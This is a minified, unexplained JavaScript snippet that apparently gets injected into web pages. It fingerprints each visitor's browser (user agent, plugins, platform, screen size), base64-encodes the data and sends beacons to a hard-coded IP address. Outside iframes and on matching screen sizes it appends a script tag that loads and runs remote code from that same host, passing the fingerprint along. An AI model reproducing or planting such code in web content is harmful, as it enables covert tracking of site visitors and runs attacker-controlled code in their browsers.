!function(a,b){function c(a){var d,e,f,g,h,i,b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";for(new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1),f=a.length,e=0,d="";f>e;){if(g=255&a.charCodeAt(e++),e==f){d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4),d+="==";break}if(h=a.charCodeAt(e++),e==f){d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4|(240&h)>>4),d+=b.charAt((15&h)<<2),d+="=";break}i=a.charCodeAt(e++),d+=b.charAt(g>>2),d+=b.charAt((3&g)<<4|(240&h)>>4),d+=b.charAt((15&h)<<2|(192&i)>>6),d+=b.charAt(63&i)}return d}function d(){return-1!=b.userAgent.indexOf("MSIE")?"ie":-1!=b.userAgent.indexOf("Chrome")?"Chrome":-1!=b.userAgent.indexOf("Firefox")?"Firefox":-1!=b.userAgent.indexOf("Opera")?"Opera":-1!=b.userAgent.indexOf("Netscape")?"Netscape":-1!=b.userAgent.indexOf("Safari")?"Safari":""}function e(){function e(){var a="",c=b.plugins;if(c.length>0)for(k=0;k<b.plugins.length;k++)a+=b.plugins[k].name+";";return a}var f=b.appName,g=b.cookieEnabled,h=b.cpuClass,i=b.mimeTypes,j=b.platform,l=b.plugins,m=b.userAgent;return pStr="type="+d()+"&userAgent="+m+"&appName="+f+"&cookieEnabled="+g+"&cpuClass="+h+"&mimeType_length="+i.length+"&platform="+j+"&plugins_length="+l.length+"&allPluginName="+e()+"&window_screen_width="+a.screen.width+"&window_screen_height="+a.screen.height+"&window_screen_colorDepth="+a.screen.colorDepth,c(pStr)}function g(a){if("AH210434"==_b)try{var b=new Image;b.src="http://183.207.103.130:8081/supplies/dot.gif?_b="+_b+"&_n="+a+"&_f="+f+"&_t="+Math.random()}catch(c){}}var h,i,j,k,l,m,n,f=0;return window.innerWidth?f=window.innerWidth:document.body&&document.body.clientWidth&&(f=document.body.clientWidth),document.documentElement&&document.documentElement.clientWidth&&(f=document.documentElement.clientWidth),window.self!=window.top?(g("iframe"),void 0):(h=0,(/AppleWebKit.*Mobile/i.test(navigator.userAgent)||navigator.userAgent.match(/(iPhone|iPod|iPad|Android|ios|BlackBerry|MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE)/i))&&(h=1),1070>f&&0==h?(g("pc"),void 0):f>1366&&1==h?(g("mb"),void 0):(i=e(),k=0,l=0,m="scripts2s",n=document.createElement("script"),n.setAttribute("type","text/javascript"),n.setAttribute("src","http://183.207.103.130:8081/pjk/xjk/index.php?b="+_b+"&pid="+i+"&c="+_c),n.id=m,document.body?document.getElementById(m)||document.body.appendChild(n):j=setInterval(function(){if(k++,10==k)return clearInterval(j),void 0;try{document.getElementById(m)||1==l?clearInterval(j):document.body&&(document.body.appendChild(n),l=1)}catch(a){}},500),void 0))}(window,navigator);
